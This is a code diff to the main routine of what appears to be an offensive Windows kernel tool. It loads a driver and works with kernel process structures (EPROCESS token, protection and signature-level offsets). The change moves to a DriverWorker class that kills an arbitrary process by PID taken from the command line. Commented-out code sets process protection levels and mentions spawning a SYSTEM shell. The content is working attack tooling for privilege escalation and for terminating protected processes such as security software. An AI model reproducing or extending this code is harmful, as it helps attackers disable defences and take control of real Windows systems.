@@ -5,6 +5,7 @@
 #include "Log.hpp"
 #include "Utils.hpp"
 #include "DriverLoader.h"
+#include "DriverWorker.hpp"
 
 #define NtCurrentProcess()				((HANDLE)(LONG_PTR)-1)
 #define SystemHandleInformation			0x10
@@ -158,6 +159,7 @@ int main(int args, char** argv)
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
 
+
 	DWORD EPROCESS_TOKEN_OFFSET = 0;
 	DWORD ProtectionOffset		= 0;
 	DWORD SignatureLevelOffset	= 0;
@@ -222,6 +224,9 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		return 1;
 	}
 
+
+	ULONG nPid = atoi(argv[1]);
+
 	ULONG64 SystemProcess{ 0 };
 	ULONG64 CurrentProcess{ 0 };
 
@@ -257,7 +262,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		LOG("[+] Current Process EPROCESS address: 0x" << std::hex << CurrentProcess << std::dec);
 	}*/
 
-	auto initResult = DriverLoader::InitializeDriver();
+	auto initResult = DriverWorker::InitializeDriver();
 	if (!initResult)
 	{
 		LOG("[-] Failed to initialize driver");
@@ -270,35 +275,26 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	
 	SetConsoleTextAttribute(hConsole, 7);
 
-	/*auto kernelBase = DriverLoader::GetKernelBase();
-	if (!kernelBase)
-	{
-		LOG("[-] Failed to get kernel base address.");
-		return 1;
-	}
-	else
-	{
-		LOG("[+] Kernel Base Address: 0x" << std::hex << kernelBase << std::dec);
-	}*/
-	
-	//UCHAR signatureLevel = 0xC; // Signature Level 0 (no signature)
-	//DriverLoader::SetSignatureLevel(CurrentProcess, SignatureLevelOffset, &signatureLevel);
+	//DriverLoader::PS_PROTECTION protection{};
+	////protection.Level = 0x01; // Protected Light
+	//protection.Type		= DriverLoader::PsProtectedTypeProtected;
+	//protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
 
-	DriverLoader::PS_PROTECTION protection{};
-	//protection.Level = 0x01; // Protected Light
-	protection.Type		= DriverLoader::PsProtectedTypeProtected;
-	protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
+	//DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);
 
-	DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);
-
-	MessageBoxA(nullptr,
+	/*MessageBoxA(nullptr,
 				"If you see this message box, the process is still alive. Click OK to spawn a SYSTEM shell.",
 				"Process Status",
-				MB_OK);
+				MB_OK);*/
 	
+	DriverWorker::UninitializeDriver();
+
+
+	Sleep(10000);
+	DriverWorker::Kill(nPid);
+
 
 	system("pause");
 
-	DriverLoader::UninitializeDriver();
 	return 0;
 }
